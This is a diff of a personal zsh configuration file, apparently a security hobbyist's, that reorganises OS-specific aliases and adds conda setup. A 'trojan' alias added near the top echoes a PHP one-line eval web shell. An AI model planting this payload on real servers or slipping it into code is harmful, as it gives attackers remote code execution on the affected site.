@@ -13,6 +13,9 @@ alias pwn="code ~/pwn"
 alias update="cd ~/maintain && git pull && sudo ln -s ~/maintain/tools/* /usr/local/bin"
 alias ggg="gaa && gcmsg ".." && gp"
 alias gitback="git reset . && git checkout . && git clean -df" # git back (to origin)
+# hacker
+alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
+alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
 function ipof(){
   ping $1 -c 1 | sed -n "1p" | cut -d '(' -f2|cut -d ')' -f1;
 }
@@ -21,42 +24,41 @@ function killport(){
 }
 # for ubuntu Desktop
 # for m1 MACbook
-if [[ $UNAME =~ "Darwin" ]]
-then
-    echo "U are using Mac! I know."
-    alias pd="prlctl start"
-    alias python3="/opt/homebrew/bin/python3"
-    alias pip3="/opt/homebrew/bin/pip3"
-    alias burp="cd ~/Desktop/BurpSuite2020.12 && nohup ./BURP.sh > /dev/null &"
-fi
+if [[ $UNAME =~ "Darwin" ]]; then
+  __conda="/opt/homebrew/Caskroom/miniconda/base"
+  echo "U are using Mac! I know."
+  alias pd="prlctl start"
+  alias python3="/opt/homebrew/bin/python3"
+  alias pip3="/opt/homebrew/bin/pip3"
+  alias burp="cd ~/Desktop/BurpSuite2020.12 && nohup ./BURP.sh > /dev/null &"
 # for WSL2
-if [[ $UNAME =~ "WSL2" ]]
-then
-    echo "U are using WSL2! I know."
-    alias pwncp="cp /mnt/c/Users/27564/Desktop/pwnfiles/* ~/pwn/target && chmod a+x ~/pwn/target/*"
-    function wsl_hosts(){
-      hosts="/mnt/c/Windows/System32/drivers/etc/hosts"
-      ip=$(ip add | grep inet | grep eth0 | awk -F" " '{print $2}' | cut -d"/" -f 1)
-      echo "new record: $ip wsl.local"
-      if [[ $(cat $hosts | grep "wsl.local") ]];
-      then
-        echo "find wsl.local in host, changing ip record...";
-        # sudo sed -i "$(cat -n $hosts | grep "share" | awk -F" " '{print $1}')i $ip wsl.local" $hosts;
-        # 上面的是用来插入内容，仅供参考学习
-        sed -i "s/^.*wsl.local/$ip wsl.local/g" $hosts
-      else echo "wsl.local not in host file, adding...";
-        sudo echo "$ip wsl.local" >> $hosts;
-      fi
-    }
-    function load(){
-      if [[ $(service $1 status | grep not) ]];then sudo service $1 start;echo "$1 just started";else echo "$1 is already running";fi
-    }
-    wsl_hosts
-    load ssh
+elif [[ $UNAME =~ "WSL2" ]]; then
+  __conda="$HOME/.miniconda"
+  echo "U are using WSL2! I know."
+  alias pwncp="cp /mnt/c/Users/27564/Desktop/pwnfiles/* ~/pwn/target && chmod a+x ~/pwn/target/*"
+  function wsl_hosts(){
+    hosts="/mnt/c/Windows/System32/drivers/etc/hosts"
+    ip=$(ip add | grep inet | grep eth0 | awk -F" " '{print $2}' | cut -d"/" -f 1)
+    echo "new record: $ip wsl.local"
+    if [[ $(cat $hosts | grep "wsl.local") ]];
+    then
+      echo "find wsl.local in host, changing ip record...";
+      # sudo sed -i "$(cat -n $hosts | grep "share" | awk -F" " '{print $1}')i $ip wsl.local" $hosts;
+      # 上面的是用来插入内容，仅供参考学习
+      sed -i "s/^.*wsl.local/$ip wsl.local/g" $hosts
+    else echo "wsl.local not in host file, adding...";
+      sudo echo "$ip wsl.local" >> $hosts;
+    fi
+  }
+  function load(){
+    if [[ $(service $1 status | grep not) ]];then sudo service $1 start;echo "$1 just started";else echo "$1 is already running";fi
+  }
+  wsl_hosts
+  load ssh
+else
+  __conda="$HOME/.miniconda"
 fi
-# hacker
-alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
-alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
+
 
 ZSH_THEME="ys"
 
@@ -75,3 +77,21 @@ ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE="fg=#ff00ff,bg=cyan,bold,underline"
 autoload -U compinit && compinit -u
 source $ZSH/oh-my-zsh.sh
 # . "$HOME/.acme.sh/acme.sh.env"
+
+# >>> conda initialize >>>
+# !! Contents within this block are managed by 'conda init' !!
+if [ -d $__conda ]; then
+  __conda_setup="$('$__conda/bin/conda' 'shell.zsh' 'hook' 2> /dev/null)"
+  if [ $? -eq 0 ]; then
+      eval "$__conda_setup"
+  else
+      if [ -f "$__conda/etc/profile.d/conda.sh" ]; then
+          . "$__conda/etc/profile.d/conda.sh"
+      else
+          export PATH="$__conda/bin:$PATH"
+      fi
+  fi
+fi
+unset __conda_setup
+# <<< conda initialize <<<
+
